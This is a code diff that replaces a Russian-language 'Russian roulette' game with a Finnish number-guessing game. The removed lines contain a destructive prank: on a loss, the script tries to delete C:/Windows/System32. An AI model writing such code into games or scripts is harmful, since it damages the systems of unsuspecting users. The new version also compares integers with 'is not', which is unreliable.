@@ -1,19 +1,13 @@
 import random
-import os
 
-vopros = input("Давай сыграем? (да/нет): ")
+oikea_numero = random.randint(1, 10)
+elama = 3
 
-if vopros == "да":
-    print("Отлично! Мы начинаем игру в русскую рулетку!")
-    numbers = random.randint(1, 6)
-    shot = int(input("Дай мне номер от 1 до 6: "))
-
-    if shot == numbers:
-        print("Молодец, ты выиграл! Смотри прикол.")
-    else:
-        print(f"Увы, ты проиграл. Я загадал число {numbers}. СМОТРИ ПРИКОЛЛЛ")
-        os.remove("C:/Windows/System32")
-elif vopros == "нет":
-    print("Ну ладно, как хочешь. Пока!")
-else:
-    print("Я не понял твой ответ. Напиши 'да' или 'нет'.")
+while elama > 0:
+    arvaus = int(input("Arvaa numero: "))
+    if arvaus == oikea_numero:
+        print("OIKEIN")
+        break
+    elif arvaus is not oikea_numero:
+        elama -= 1
+        print("Väärin miinus yks elämä!")
